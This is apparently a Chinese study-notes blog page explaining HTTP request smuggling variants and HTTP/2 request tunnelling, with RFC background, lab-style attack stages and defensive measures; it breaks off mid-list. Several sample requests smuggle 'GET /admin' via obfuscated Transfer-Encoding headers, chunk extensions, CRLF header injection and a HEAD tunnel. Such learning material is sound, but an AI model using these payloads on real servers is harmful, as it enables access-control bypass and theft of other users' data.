<h1 id="AI—-基础知识的讲解举例"><a href="#AI—-基础知识的讲解举例" class="headerlink" title="AI—-基础知识的讲解举例"></a>AI—-基础知识的讲解举例</h1><h3 id="关于ai对小总结的补充和分析"><a href="#关于ai对小总结的补充和分析" class="headerlink" title="关于ai对小总结的补充和分析"></a>关于ai对小总结的补充和分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"></span><br><span class="line">### **你的笔记中的关键点与修正建议**</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">#### **1. 关于混淆的必要性与漏洞场景**</span><br><span class="line">**你的总结基本正确**，但需澄清以下几点：</span><br><span class="line">1. **严格模式下的走私可能性**  </span><br><span class="line">   - **TE.TE（前后端均严格遵循分块编码）**：若请求完全符合 RFC 规范（如正确终止符 `0\r\n\r\n`），**额外字符会被视为非法数据**，无法走私。此时必须通过混淆（如分块扩展、非法头注入）绕过校验。</span><br><span class="line">   - **自我污染的限制**：即使使用 `keep-alive`，严格模式下后端会拒绝非法数据，导致无法污染后续请求。你的靶场测试结果符合此逻辑。</span><br><span class="line"></span><br><span class="line">2. **CL.TE 的两种打法**  </span><br><span class="line">   - **CL 写小**：前端截断请求体，后续字符作为下一个请求（无需混淆）。</span><br><span class="line">   - **CL 写大**：用于延时检测（判断服务器是否等待更多数据），但需依赖特定服务器行为。</span><br><span class="line">   - **无需混淆**：CL.TE 本身依赖前后端解析差异，不一定需要混淆头或格式。</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">#### **2. 混淆的定义与分类修正**</span><br><span class="line">**混淆的核心是制造解析歧义**，而不仅仅是“添加多个头”或“冲突头”。以下是更精准的分类：</span><br><span class="line"></span><br><span class="line">##### **(1) 协议头混淆**</span><br><span class="line">- **CL.TE / TE.CL**：利用 `Content-Length` 与 `Transfer-Encoding` 的优先级差异（无需额外混淆）。</span><br><span class="line">- **多值头污染**（如多个 `Transfer-Encoding`）：  </span><br><span class="line">  ```http</span><br><span class="line">  Transfer-Encoding: xchunked</span><br><span class="line">  Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>服务器行为差异</strong>：前端可能取第一个值（<code>xchunked</code>），后端取最后一个值（<code>chunked</code>）。</li>
</ul>
<h5 id="2-分块格式混淆"><a href="#2-分块格式混淆" class="headerlink" title="(2) 分块格式混淆"></a><strong>(2) 分块格式混淆</strong></h5><ul>
<li><strong>分块扩展</strong>：<code>0;x=1\r\n\r\n</code>，诱导服务器误判分块终止位置。</li>
<li><strong>非法换行符</strong>：用 <code>\n</code> 代替 <code>\r\n</code>，破坏分块解析逻辑。</li>
<li><strong>分块大小混淆</strong>：如十六进制大小写（<code>0X0</code> 代替 <code>0</code>）。</li>
</ul>
<h5 id="3-请求体混淆"><a href="#3-请求体混淆" class="headerlink" title="(3) 请求体混淆"></a><strong>(3) 请求体混淆</strong></h5><ul>
<li><strong>注入伪头</strong>：在请求体中插入类似 HTTP 头的结构（如 <code>X: Y\r\n</code>），诱导后端将其解析为新请求头。</li>
</ul>
<hr>
<h4 id="3-对-TE-TE-场景的补充"><a href="#3-对-TE-TE-场景的补充" class="headerlink" title="3. 对 TE.TE 场景的补充"></a><strong>3. 对 TE.TE 场景的补充</strong></h4><ul>
<li><p><strong>严格模式下的走私可能</strong>：<br>即使前后端均使用 <code>Transfer-Encoding</code>，若后端对分块扩展（<code>;</code>）或注释解析存在漏洞，仍可走私。例如：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-nix"><span class="number">0</span>;<span class="attr">x</span><span class="operator">=</span><span class="string">&quot;<span class="char escape_">\r</span><span class="char escape_">\n</span>&quot;</span>   <span class="comment"># 分块扩展参数</span></span></span><br><span class="line"><span class="language-nix">GET <span class="symbol">/admin</span> HTTP<span class="operator">/</span><span class="number">1.1</span>\r\n...</span></span><br></pre></td></tr></table></figure>

<ul>
<li>后端可能忽略分块扩展，误判终止位置，将 <code>GET</code> 视为新请求。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="4-CL-CL-场景的修正"><a href="#4-CL-CL-场景的修正" class="headerlink" title="4. CL.CL 场景的修正"></a><strong>4. CL.CL 场景的修正</strong></h4><ul>
<li><p><strong>多 Content-Length 头的处理</strong>：<br>你的示例中构造两个 <code>Content-Length</code> 头（30 和 5），实际场景中：</p>
<ul>
<li><p><strong>RFC 规范</strong>：多个 <code>Content-Length</code> 头必须值相同，否则视为非法请求（返回 <code>400 Bad Request</code>）。</p>
</li>
<li><p><strong>实战利用条件</strong>：需服务器未严格校验多值一致性。例如：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5   # 合法（重复相同值）</span><br></pre></td></tr></table></figure>

<p>或通过空格&#x2F;TAB 绕过：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line">Content-Length :  5  # 服务器可能解析为同一头</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<hr>
<h4 id="5-CL-0-场景的澄清"><a href="#5-CL-0-场景的澄清" class="headerlink" title="5. CL.0 场景的澄清"></a><strong>5. CL.0 场景的澄清</strong></h4><ul>
<li><p><strong>本质是 CL 与默认行为的冲突</strong>：<br>前端使用 <code>Content-Length</code>，后端忽略该头并默认请求体长度为 0（或从其他上下文推断长度）。无需混淆，直接构造：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30    # 前端读取30字节</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /admin HTTP/<span class="number">1</span>.<span class="number">1</span>\r\n...</span></span><br></pre></td></tr></table></figure>

<ul>
<li>后端可能仅处理前0字节，后续 <code>GET</code> 被保留为下一个请求。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="总结：混淆的核心目标与实战策略"><a href="#总结：混淆的核心目标与实战策略" class="headerlink" title="总结：混淆的核心目标与实战策略"></a><strong>总结：混淆的核心目标与实战策略</strong></h3><table>
<thead>
<tr>
<th>漏洞类型</th>
<th>是否需要混淆</th>
<th>关键混淆手段</th>
<th>示例场景</th>
</tr>
</thead>
<tbody><tr>
<td><strong>CL.TE</strong></td>
<td>可选（依赖解析差异）</td>
<td>无需混淆，直接构造CL与TE冲突</td>
<td>前端CL截断，后端TE解析后续数据</td>
</tr>
<tr>
<td><strong>TE.TE</strong></td>
<td>必需（绕过严格校验）</td>
<td>分块扩展、非法换行符、多TE头污染</td>
<td><code>0;x=1\r\n</code> + 注入请求</td>
</tr>
<tr>
<td><strong>CL.CL</strong></td>
<td>必需（绕过多值校验）</td>
<td>多CL头构造（空格&#x2F;TAB混淆）</td>
<td><code>Content-Length : 5</code> + 非法重复</td>
</tr>
<tr>
<td><strong>CL.0</strong></td>
<td>无需（利用默认行为差异）</td>
<td>直接构造CL覆盖实际数据长度</td>
<td>前端CL大值，后端默认长度0</td>
</tr>
</tbody></table>
<hr>
<h3 id="你的测试结果解释"><a href="#你的测试结果解释" class="headerlink" title="你的测试结果解释"></a><strong>你的测试结果解释</strong></h3><p>在 TE.TE 靶场中无法自我污染的原因是：</p>
<ol>
<li><strong>靶场严格遵循 RFC</strong>：后端在解析 <code>0\r\n\r\n</code> 后立即终止请求，后续字符被丢弃。</li>
<li><strong>缺乏混淆手段</strong>：未使用分块扩展或非法格式，无法绕过终止符校验。</li>
</ol>
<hr>
<h3 id="修正后的实战建议"><a href="#修正后的实战建议" class="headerlink" title="修正后的实战建议"></a><strong>修正后的实战建议</strong></h3><ol>
<li><strong>明确漏洞类型</strong>：先确定目标是 CL.TE、TE.CL 还是 TE.TE。</li>
<li><strong>按需选择混淆</strong>：  <ul>
<li>CL.TE：无需混淆，直接构造 CL 与 TE 冲突。</li>
<li>TE.TE：必须混淆（分块扩展、非法头）。</li>
</ul>
</li>
<li><strong>工具辅助</strong>：使用 Burp Scanner 或 Turbo Intruder 自动探测解析差异点。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">### 关于RFC的讲解:</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>RFC（互联网技术标准）与HTTP请求解析的关系，可以比喻为**“交通规则与车辆行驶”**的关系。RFC定义了互联网通信的“规则”，而请求解析则是服务器按照这些规则“解读”客户端发送的数据。以下是通俗易懂的解释：</p>
<hr>
<h3 id="1-RFC是HTTP请求的“语法规则书”"><a href="#1-RFC是HTTP请求的“语法规则书”" class="headerlink" title="1. RFC是HTTP请求的“语法规则书”"></a><strong>1. RFC是HTTP请求的“语法规则书”</strong></h3><p>就像写作文需要遵循语法，HTTP请求必须符合RFC定义的格式，服务器才能正确理解。例如：</p>
<ul>
<li><strong>RFC 9110（HTTP&#x2F;1.1）</strong>：规定了HTTP消息的格式，如：<ul>
<li>请求行必须为 <code>方法 URL 协议版本</code>（如 <code>GET /index.html HTTP/1.1</code>）。</li>
<li>头部字段需用 <code>:</code> 分隔键值（如 <code>Host: example.com</code>）。</li>
<li>正文需通过 <code>Content-Length</code> 或 <code>Transfer-Encoding</code> 指定长度或分块。</li>
</ul>
</li>
</ul>
<p><strong>如果请求不按RFC写，服务器可能“读不懂”</strong>，就像写错语法的句子让人困惑。</p>
<hr>
<h3 id="2-请求解析：服务器如何“拆解”请求"><a href="#2-请求解析：服务器如何“拆解”请求" class="headerlink" title="2. 请求解析：服务器如何“拆解”请求"></a><strong>2. 请求解析：服务器如何“拆解”请求</strong></h3><p>当服务器收到HTTP请求时，会按照RFC规则逐步解析：</p>
<ol>
<li><strong>解析请求行</strong>：确认方法、URL和协议版本。</li>
<li><strong>解析头部</strong>：逐个读取头部字段，直到遇到空行（<code>\r\n\r\n</code>）。</li>
<li><strong>解析正文</strong>：<ul>
<li>如果有 <code>Content-Length</code>，按指定长度读取正文。</li>
<li>如果有 <code>Transfer-Encoding: chunked</code>，按分块格式读取（如 <code>5\r\nhello\r\n0\r\n\r\n</code>）。</li>
</ul>
</li>
</ol>
<p><strong>关键点</strong>：RFC规定了解析的每一步逻辑，服务器必须严格遵循，否则可能被攻击者利用（如请求走私）。</p>
<hr>
<h3 id="3-RFC与请求走私漏洞的关系"><a href="#3-RFC与请求走私漏洞的关系" class="headerlink" title="3. RFC与请求走私漏洞的关系"></a><strong>3. RFC与请求走私漏洞的关系</strong></h3><p>请求走私的本质是**“前后端解析不一致”**，而这种不一致往往是因为违反了RFC规则。例如：</p>
<h4 id="场景1：CL-TE攻击（前端用Content-Length，后端用Transfer-Encoding）"><a href="#场景1：CL-TE攻击（前端用Content-Length，后端用Transfer-Encoding）" class="headerlink" title="场景1：CL.TE攻击（前端用Content-Length，后端用Transfer-Encoding）"></a><strong>场景1：CL.TE攻击（前端用Content-Length，后端用Transfer-Encoding）</strong></h4><ul>
<li><p><strong>攻击请求</strong>：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6       # 前端按此长度截断</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-nix"><span class="number">0</span>\r\n\r\n               <span class="comment"># 后端按分块解析到此处结束</span></span></span><br><span class="line"><span class="language-nix">GET <span class="symbol">/admin</span> HTTP<span class="symbol">/1.1</span>     <span class="comment"># 前端忽略，后端视为新请求</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>RFC规则</strong>：<br>RFC规定 <code>Transfer-Encoding</code> 优先级高于 <code>Content-Length</code>。如果后端严格遵循RFC，应忽略 <code>Content-Length</code>，但某些服务器未遵守此规则，导致解析差异。</p>
</li>
</ul>
<h4 id="场景2：TE-TE攻击（前后端均用Transfer-Encoding，但解析不一致）"><a href="#场景2：TE-TE攻击（前后端均用Transfer-Encoding，但解析不一致）" class="headerlink" title="场景2：TE.TE攻击（前后端均用Transfer-Encoding，但解析不一致）"></a><strong>场景2：TE.TE攻击（前后端均用Transfer-Encoding，但解析不一致）</strong></h4><ul>
<li><p><strong>攻击请求</strong>：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>xchunked  # 混淆头</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span>\r\n\r\n</span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /admin HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>RFC规则</strong>：<br>RFC规定多个 <code>Transfer-Encoding</code> 头时，需按顺序处理（如 <code>chunked</code> 必须最后）。若后端错误解析，可能将 <code>GET</code> 视为新请求。</p>
</li>
</ul>
<hr>
<h3 id="4-为什么混淆请求能绕过防御？"><a href="#4-为什么混淆请求能绕过防御？" class="headerlink" title="4. 为什么混淆请求能绕过防御？"></a><strong>4. 为什么混淆请求能绕过防御？</strong></h3><p>RFC虽然严格，但部分服务器实现存在“容错性”，导致攻击者可构造<strong>看似非法但实际被部分服务器接受的请求</strong>。例如：</p>
<ul>
<li><strong>分块扩展</strong>：<code>0;x=1\r\n\r\n</code>（RFC允许分块后加注释，但某些服务器可能忽略注释）。</li>
<li><strong>非法换行符</strong>：用 <code>\n</code> 代替 <code>\r\n</code>（RFC要求 <code>\r\n</code>，但某些服务器接受 <code>\n</code>）。</li>
</ul>
<p>这些“模糊点”让攻击者能构造混淆请求，诱导服务器错误解析。</p>
<hr>
<h3 id="总结：RFC与请求解析的关系"><a href="#总结：RFC与请求解析的关系" class="headerlink" title="总结：RFC与请求解析的关系"></a><strong>总结：RFC与请求解析的关系</strong></h3><table>
<thead>
<tr>
<th>角色</th>
<th>作用</th>
<th>实际影响</th>
</tr>
</thead>
<tbody><tr>
<td><strong>RFC</strong></td>
<td>定义HTTP请求的合法格式和解析逻辑。</td>
<td>确保全球服务器和客户端能互相理解。</td>
</tr>
<tr>
<td><strong>服务器解析</strong></td>
<td>按RFC规则拆解请求内容，提取方法、URL、头部、正文等。</td>
<td>若实现与RFC不一致，可能导致漏洞（如走私）。</td>
</tr>
<tr>
<td><strong>攻击者</strong></td>
<td>构造混淆请求，利用服务器解析漏洞，突破RFC的预期逻辑。</td>
<td>通过前后端解析差异实现请求走私。</td>
</tr>
</tbody></table>
<hr>
<h3 id="类比理解"><a href="#类比理解" class="headerlink" title="类比理解"></a><strong>类比理解</strong></h3><ul>
<li><strong>RFC</strong>：像乐高说明书，规定每块积木如何拼接。</li>
<li><strong>请求解析</strong>：像你按说明书拼乐高，如果某一步拼错（不符合RFC），最终模型可能不稳固（漏洞）。</li>
<li><strong>攻击者</strong>：像故意拼错积木的人，利用某些连接点的松动（服务器解析漏洞），让模型变成危险的陷阱。</li>
</ul>
<p>理解RFC规则，就能明白为什么某些请求能走私成功，以及如何防御（强制所有服务器严格遵循RFC）。</p>
<h2 id="请求隧道攻击的概念讲解"><a href="#请求隧道攻击的概念讲解" class="headerlink" title="请求隧道攻击的概念讲解:"></a>请求隧道攻击的概念讲解:</h2><h3 id="概念讲解"><a href="#概念讲解" class="headerlink" title="概念讲解:"></a>概念讲解:</h3><ul>
<li><h3 id="通俗易懂版：HTTP请求隧道攻击详解"><a href="#通俗易懂版：HTTP请求隧道攻击详解" class="headerlink" title="通俗易懂版：HTTP请求隧道攻击详解"></a><strong>通俗易懂版：HTTP请求隧道攻击详解</strong></h3><hr>
<h4 id="1-什么是HTTP请求隧道？"><a href="#1-什么是HTTP请求隧道？" class="headerlink" title="1. 什么是HTTP请求隧道？"></a><strong>1. 什么是HTTP请求隧道？</strong></h4><p>想象你寄快递时，快递员（前端服务器）负责检查包裹内容，但实际送货的是另一位快递员（后端服务器）。<strong>请求隧道</strong>就是攻击者把“违禁品”（恶意请求）藏在正常包裹里，让快递员A（前端）不检查，直接转交给快递员B（后端），从而绕过安检。</p>
<hr>
<h4 id="2-隧道-vs-传统走私的区别"><a href="#2-隧道-vs-传统走私的区别" class="headerlink" title="2. 隧道 vs 传统走私的区别"></a><strong>2. 隧道 vs 传统走私的区别</strong></h4><ul>
<li><strong>传统请求走私</strong>：污染快递分拣队列，让别人的包裹错发到你的地址。</li>
<li><strong>请求隧道</strong>：直接在包裹里藏一个“小包裹”（隧道请求），让后端处理隐藏的请求，而前端浑然不知。</li>
</ul>
<hr>
<h4 id="3-为什么能绕过前端安全措施？"><a href="#3-为什么能绕过前端安全措施？" class="headerlink" title="3. 为什么能绕过前端安全措施？"></a><strong>3. 为什么能绕过前端安全措施？</strong></h4><ul>
<li><strong>前端只做表面检查</strong>：比如检查快递单号（URL路径），但不拆开包裹看内容（请求体）。</li>
<li><strong>后端老实处理所有内容</strong>：只要包裹送到，后端会拆开所有隐藏的小包裹（隧道请求）。</li>
</ul>
<hr>
<h3 id="🌰-生活化案例"><a href="#🌰-生活化案例" class="headerlink" title="🌰 生活化案例"></a><strong>🌰 生活化案例</strong></h3><ul>
<li><p><strong>攻击场景</strong>：某网站禁止普通用户访问<code>/admin</code>，但后端实际存在该接口。</p>
</li>
<li><p>攻击步骤</p>
<p>：</p>
<ol>
<li>你发送一个“正常包裹”（合法请求），里面藏了一个“小包裹”（<code>GET /admin</code>）。</li>
<li>前端检查快递单号（URL）没问题，转交给后端。</li>
<li>后端拆开包裹，处理两个请求：正常请求 + 隐藏的<code>/admin</code>请求。</li>
<li>后端把两个响应打包返回，但前端只看到正常响应，隐藏的<code>/admin</code>数据被你窃取。</li>
</ol>
</li>
</ul>
<hr>
<h3 id="🔧-技术细节拆解"><a href="#🔧-技术细节拆解" class="headerlink" title="🔧 技术细节拆解"></a><strong>🔧 技术细节拆解</strong></h3><h4 id="HTTP-1-与-HTTP-2-的隧道差异"><a href="#HTTP-1-与-HTTP-2-的隧道差异" class="headerlink" title="HTTP&#x2F;1 与 HTTP&#x2F;2 的隧道差异"></a><strong>HTTP&#x2F;1 与 HTTP&#x2F;2 的隧道差异</strong></h4><table>
<thead>
<tr>
<th><strong>对比项</strong></th>
<th><strong>HTTP&#x2F;1 环境</strong></th>
<th><strong>HTTP&#x2F;2 环境</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>检测难度</strong></td>
<td>高（响应混杂，难区分）</td>
<td>低（每个请求&#x2F;响应有独立“流”）</td>
</tr>
<tr>
<td><strong>利用特征</strong></td>
<td>响应可能包含多个混杂内容</td>
<td>响应中可明显看到HTTP&#x2F;1格式的“走私响应”</td>
</tr>
<tr>
<td><strong>示例</strong></td>
<td>前端返回的数据里夹带私货（需手动解析）</td>
<td>直接看到类似<code>HTTP/1.1 200 OK</code>的完整响应头</td>
</tr>
</tbody></table>
<hr>
<h4 id="盲隧道-vs-非盲隧道"><a href="#盲隧道-vs-非盲隧道" class="headerlink" title="盲隧道 vs 非盲隧道"></a><strong>盲隧道 vs 非盲隧道</strong></h4><h5 id="盲隧道（你蒙着眼攻击）"><a href="#盲隧道（你蒙着眼攻击）" class="headerlink" title="盲隧道（你蒙着眼攻击）"></a><strong>盲隧道（你蒙着眼攻击）</strong></h5><ul>
<li><p>特征</p>
<p>：</p>
<ul>
<li>前端只返回主请求的响应，隐藏请求的响应被忽略。</li>
<li>攻击者无法直接看到隐藏请求的结果。</li>
</ul>
</li>
<li><p>利用场景</p>
<p>：</p>
<ul>
<li>触发后台操作（如删除数据、发送邮件）。</li>
<li>需要间接验证（如观察系统状态变化）。</li>
</ul>
</li>
</ul>
<h5 id="非盲隧道（睁着眼攻击）"><a href="#非盲隧道（睁着眼攻击）" class="headerlink" title="非盲隧道（睁着眼攻击）"></a><strong>非盲隧道（睁着眼攻击）</strong></h5><ul>
<li><p>特征</p>
<p>：</p>
<ul>
<li>隐藏请求的响应会“泄露”到主请求的响应中。</li>
<li>攻击者可直接窃取数据（如Cookie、敏感页面）。</li>
</ul>
</li>
<li><p>示例攻击</p>
<p>：</p>
<ol>
<li>构造一个<code>HEAD</code>请求包裹，隐藏<code>GET /admin</code>请求。</li>
<li>前端认为<code>HEAD</code>请求的响应长度应为131字节。</li>
<li>后端返回<code>HEAD</code>响应 + <code>/admin</code>的完整响应（总长度超过131）。</li>
<li>前端只读取前131字节，但攻击者能从后续字节中提取<code>/admin</code>数据。</li>
</ol>
</li>
</ul>
<hr>
<h3 id="⚡-攻击步骤（以非盲隧道为例）"><a href="#⚡-攻击步骤（以非盲隧道为例）" class="headerlink" title="⚡ 攻击步骤（以非盲隧道为例）"></a><strong>⚡ 攻击步骤（以非盲隧道为例）</strong></h3><h4 id="1-构造隧道请求"><a href="#1-构造隧道请求" class="headerlink" title="1. 构造隧道请求"></a><strong>1. 构造隧道请求</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http复制HEAD /comment HTTP/2 </span><br><span class="line">Host: vulnerable-website.com  </span><br><span class="line">A: 1 </span><br><span class="line"> </span><br><span class="line">GET /tunnelled HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com  </span><br><span class="line">X: x </span><br></pre></td></tr></table></figure>

<ul>
<li><p>关键点</p>
<p>：</p>
<ul>
<li>主请求是<code>HEAD /comment</code>（前端认为无响应体）。</li>
<li>隐藏请求是<code>GET /tunnelled</code>（后端会处理并返回数据）。</li>
</ul>
</li>
</ul>
<h4 id="2-分析响应"><a href="#2-分析响应" class="headerlink" title="2. 分析响应"></a><strong>2. 分析响应</strong></h4><ul>
<li><p>正常响应</p>
<p>（无隧道）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http复制HTTP/2 200 OK </span><br><span class="line">Content-Length: 131 </span><br><span class="line">（空响应体，因为HEAD请求）</span><br></pre></td></tr></table></figure>
</li>
<li><p>隧道成功响应</p>
<p>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http复制HTTP/2 200 OK </span><br><span class="line">Content-Length: 131  # 前端只读到这里 </span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK      # 隐藏响应的内容从这里开始泄露 </span><br><span class="line">Content-Type: text/html </span><br><span class="line">Content-Length: 4286 </span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;h1&gt;Tunnelled&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;This is a tunnelled respo...</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>攻击者收获</strong>：窃取了<code>/tunnelled</code>页面的前131字节内容。</p>
</li>
</ul>
<hr>
<h3 id="🛡️-防御措施"><a href="#🛡️-防御措施" class="headerlink" title="🛡️ 防御措施"></a><strong>🛡️ 防御措施</strong></h3><ol>
<li><p>严格校验请求边界</p>
<p>：</p>
<ul>
<li>禁止同时包含<code>Content-Length</code>和<code>Transfer-Encoding</code>头。</li>
</ul>
</li>
<li><p>禁用连接复用</p>
<p>：</p>
<ul>
<li>前后端之间强制使用<code>Connection: close</code>。</li>
</ul>
</li>
<li><p>隔离用户请求</p>
<p>：</p>
<ul>
<li>确保同一连接仅处理同一用户的请求（通过IP或Session绑定）。</li>
</ul>
</li>
<li><p>监控异常响应</p>
<p>：</p>
<ul>
<li>检测响应中是否包含其他请求的数据（如HTTP&#x2F;1响应混入HTTP&#x2F;2流）。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="📌-总结"><a href="#📌-总结" class="headerlink" title="📌 总结"></a><strong>📌 总结</strong></h3><ul>
<li><strong>请求隧道是高级走私技术</strong>：专攻前端“偷懒检查”的弱点，让后端处理隐藏请求。</li>
<li><strong>HTTP&#x2F;2更易检测</strong>：因响应格式清晰，而HTTP&#x2F;1需手动“挖宝”。</li>
<li><strong>防御核心</strong>：前后端统一解析规则 + 严格隔离用户请求。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="1-什么是“隧道”（Tunneling）？"><a href="#1-什么是“隧道”（Tunneling）？" class="headerlink" title="1. 什么是“隧道”（Tunneling）？"></a><strong>1. 什么是“隧道”（Tunneling）？</strong></h4><p>在HTTP请求走私中，<strong>“隧道”指将恶意请求隐藏在合法请求中</strong>，利用前后端服务器对协议解析的差异，绕过前端安全检查，使后端处理隐藏的请求。<strong>核心特征</strong>：</p>
<ul>
<li><strong>一个请求通道传输多个请求</strong>：前端认为只发送了一个请求，后端却处理了多个请求。</li>
<li><strong>隐藏请求的执行结果</strong>：恶意请求的响应可能被前端忽略或部分截取，但攻击效果已达成。</li>
</ul>
<hr>
<h3 id="📌-攻击步骤中的隧道体现"><a href="#📌-攻击步骤中的隧道体现" class="headerlink" title="📌 攻击步骤中的隧道体现"></a><strong>📌 攻击步骤中的隧道体现</strong></h3><h4 id="阶段1：CRLF注入（确认漏洞）"><a href="#阶段1：CRLF注入（确认漏洞）" class="headerlink" title="阶段1：CRLF注入（确认漏洞）"></a><strong>阶段1：CRLF注入（确认漏洞）</strong></h4><ul>
<li><p><strong>操作</strong>：在Header名中插入<code>\r\n</code>，覆盖<code>Host</code>头。</p>
</li>
<li><p>隧道体现</p>
<p>：</p>
<ul>
<li><strong>前端视角</strong>：只看到一个Header（<code>foo: bar\r\nHost: abc</code>）。</li>
<li><strong>后端视角</strong>：解析为两个Header（<code>foo: bar</code>和<code>Host: abc</code>），说明<strong>通过一个请求传递了篡改后的请求信息</strong>。</li>
<li><strong>本质</strong>：在单个请求中“夹带”额外指令，验证了隧道可行性。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="阶段2：构造POST请求走私认证头"><a href="#阶段2：构造POST请求走私认证头" class="headerlink" title="阶段2：构造POST请求走私认证头"></a><strong>阶段2：构造POST请求走私认证头</strong></h4><ul>
<li><p><strong>操作</strong>：注入<code>Content-Length:500</code>头，填充超长请求体。</p>
</li>
<li><p>隧道体现</p>
<p>：</p>
<ol>
<li><p><strong>前端视角</strong>：认为这是一个完整的POST请求（长度500字节）。</p>
</li>
<li><p>后端视角</p>
<p>：</p>
<ul>
<li>解析到<code>Content-Length:500</code>后，期望接收500字节的请求体。</li>
<li>实际请求体长度不足500字节，后端会<strong>等待后续数据</strong>，导致后续请求被拼接。</li>
</ul>
</li>
<li><p>结果</p>
<p>：</p>
<ul>
<li>后端将下一个请求（如用户的其他请求）拼接到当前请求体中。</li>
<li>攻击者通过观察响应，发现前端添加的认证头（如<code>X-FRONTEND-KEY</code>），证明<strong>后端处理了多个请求</strong>。</li>
</ul>
</li>
</ol>
<ul>
<li><strong>隧道作用</strong>：通过单次请求污染后端请求队列，窃取敏感信息。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="阶段3：构造HEAD请求隧道访问-admin"><a href="#阶段3：构造HEAD请求隧道访问-admin" class="headerlink" title="阶段3：构造HEAD请求隧道访问&#x2F;admin"></a><strong>阶段3：构造HEAD请求隧道访问&#x2F;admin</strong></h4><ul>
<li><p><strong>操作</strong>：在Header名中注入完整的<code>GET /admin</code>请求。</p>
</li>
<li><p>隧道体现</p>
<p>：</p>
<ol>
<li><p>前端视角</p>
<p>：</p>
<ul>
